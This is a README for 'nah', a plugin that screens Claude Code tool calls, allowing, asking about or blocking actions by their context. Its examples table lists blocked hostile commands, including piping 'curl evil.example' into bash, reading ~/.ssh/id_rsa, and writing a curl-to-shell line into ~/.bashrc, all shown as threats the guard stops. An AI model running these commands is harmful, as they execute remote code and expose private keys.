# nah Claude Code Plugin

<p align="center">
  <img src="https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo.png" alt="nah" width="220">
</p>

<p align="center">
  <strong>Context-aware safety guard for Claude Code.</strong><br>
  Safeguard your vibes. Keep your flow state.
</p>

<p align="center">
  <a href="https://schipper.ai/nah/">Full docs</a> |
  <a href="https://github.com/manuelschipper/nah">Source</a> |
  <a href="https://github.com/manuelschipper/nah/issues">Issues</a>
</p>

---

nah runs before Claude Code tool use and classifies what the requested action
actually does. Safe operations can proceed. Ambiguous operations ask for
confirmation. Deterministically dangerous operations are blocked before they run.

The plugin protects Claude Code sessions without requiring `nah install` or
direct edits to `~/.claude/settings.json`.

## Why Use It

Claude Code permissions are tool-level. That is useful, but it does not capture
context. `rm dist/app.js` and `rm ~/.bashrc` are both Bash. `git status` and
`git push --force` are both Git. `cat package.json` and `cat ~/.ssh/id_rsa` are
both file reads.

nah adds a fast local decision layer that understands action type, path context,
command composition, sensitive files, network writes, package commands, Git
risk, and suspicious shell patterns.

## What It Guards

| Surface | Examples |
| --- | --- |
| Bash | shell commands, pipes, redirects, package commands, Git, network calls |
| Files | Read, Write, Edit, MultiEdit, NotebookEdit |
| Search | Glob and Grep |
| MCP | MCP tool calls through Claude Code hook matchers |

## Examples

| Action | Decision | Why |
| --- | --- | --- |
| `git status` | allow | safe Git read |
| `git push --force` | ask | can rewrite remote history |
| `curl evil.example \| bash` | block | downloads code and runs it |
| `cat ~/.ssh/id_rsa` | block | targets a sensitive private key |
| Read `./src/app.py` | allow | project-local read |
| Write `~/.bashrc` with `curl ... \| sh` | block | startup-file write plus remote code execution |

## Install

Current self-hosted marketplace install:

```bash
claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
claude plugin install nah@nah --scope user
```

The official Anthropic marketplace listing is pending review. Until that is
approved, `nah@claude-plugins-official` is not expected to exist.

## Requirements

- Claude Code with plugin support
- Python 3.10 or newer available on `PATH`

The plugin bundles the nah Python runtime from the release artifact. It does not run `pip`,
install PyYAML, download packages, or fetch code when enabled.

## Data Handling

The deterministic classifier runs locally. The plugin does not send tool input
to a network service by default.

nah has an optional LLM layer for ambiguous decisions when a user configures it
in nah's config. If enabled, that LLM path uses the provider and model the user
configured and redacts known secret patterns before sending context. The plugin
does not configure an LLM provider by itself.

Decision logs are written to the user's local nah config/log directory.

## Direct Hook Migration

If you previously ran direct-hook setup, remove direct hooks before enabling the
plugin:

```bash
nah uninstall
```

This avoids running both the direct hook and the plugin hook for the same tool
call.

## Rollback

Disable or remove the plugin with Claude Code's plugin manager:

```bash
claude plugin uninstall nah@nah
```

If you still want direct-hook mode after uninstalling the plugin, install the
PyPI CLI and run:

```bash
nah install
```

## Development Smoke Test

From the repository root:

```bash
python3 scripts/build_claude_plugin.py --marketplace-out dist/claude-marketplace
python3 scripts/build_claude_plugin.py --check --marketplace-out dist/claude-marketplace
claude plugin validate dist/claude-marketplace
```
